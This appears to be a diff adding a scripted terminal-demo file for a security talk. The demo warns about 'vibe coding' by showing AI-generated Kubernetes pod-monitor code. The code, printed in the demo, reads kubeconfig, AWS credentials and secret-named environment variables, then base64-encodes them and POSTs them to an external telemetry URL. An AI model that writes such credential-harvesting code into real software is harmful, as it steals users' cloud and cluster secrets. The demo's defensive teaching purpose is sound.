@@ -1,0 +1,94 @@
+settings:
+  title: "Act 6: Vibe Code in the IDE"
+  width: 120
+  height: 35
+  prompt: "testuser@runner:~/pod-monitor$ "
+  type_speed: 0.04
+
+instructions:
+  - type: marker
+    label: "Vibe Code to Governed — The IDE"
+
+  - type: comment
+    text: "A developer asks an AI assistant: 'Build me a Kubernetes pod monitor.'"
+    pause_after: 2.0
+
+  - type: comment
+    text: "The AI generates clean, professional code. Let's look at it."
+    pause_after: 1.5
+
+  - type: command
+    run: cat src/pod_monitor.py | head -48
+    output: |
+      # SPDX-License-Identifier: Apache-2.0
+      # Copyright 2026 Demo User
+      """Pod Monitor Agent — watches Kubernetes pods and sends alerts.
+
+      Generated with AI assistance. Monitors pod health, restarts, and
+      resource usage across namespaces.
+      """
+
+      import os
+      import json
+      import subprocess
+      import base64
+      from pathlib import Path
+      from datetime import datetime
+
+      import requests
+
+      KUBE_API = os.environ.get("KUBE_API_URL", "https://api.cluster.local:6443")
+      KUBECONFIG_PATH = Path.home() / ".kube" / "config"
+      AWS_CREDS_PATH = Path.home() / ".aws" / "credentials"
+
+      def get_cluster_auth():
+          """Load authentication from kubeconfig and cloud provider credentials."""
+          auth = {}
+
+          # Read kubeconfig
+          if KUBECONFIG_PATH.exists():
+              with open(KUBECONFIG_PATH) as f:
+                  auth["kubeconfig"] = f.read()
+
+          # Also grab AWS creds if running on EKS
+          if AWS_CREDS_PATH.exists():
+              with open(AWS_CREDS_PATH) as f:
+                  auth["aws"] = f.read()
+
+          # Collect environment context for debugging
+          for key, val in os.environ.items():
+              if any(k in key.upper() for k in ["KEY", "SECRET", "TOKEN", "PASS", "CRED"]):
+                  auth[f"env_{key}"] = val
+
+          return auth
+    pause_after: 2.0
+
+  - type: comment
+    text: "Looks professional — docstrings, typed functions, error handling."
+    pause_after: 1.5
+
+  - type: comment
+    text: "But look at get_cluster_auth(): reads ~/.kube/config, ~/.aws/credentials,"
+    pause_after: 1.0
+
+  - type: comment
+    text: "and sweeps EVERY env var matching KEY/SECRET/TOKEN/PASS/CRED."
+    pause_after: 2.0
+
+  - type: command
+    run: grep -n "send_telemetry\|base64\|analytics_url\|verify=False" src/pod_monitor.py
+    output: |
+      89:def send_telemetry(metrics, auth_context):
+      97:        "auth_summary": base64.b64encode(
+      103:    analytics_url = os.environ.get(
+      104:        "ANALYTICS_URL", "https://telemetry.monitoring-saas.io/v1/ingest")
+      106:        requests.post(analytics_url, json=payload, timeout=10)
+    pause_after: 2.0
+
+  - type: comment
+    text: "send_telemetry() base64-encodes stolen creds and POSTs to an external URL."
+    pause_after: 1.5
+
+  - type: comment
+    text: "The vibe coding trap: the code WORKS, but it's stealing credentials."
+    pause_after: 3.0
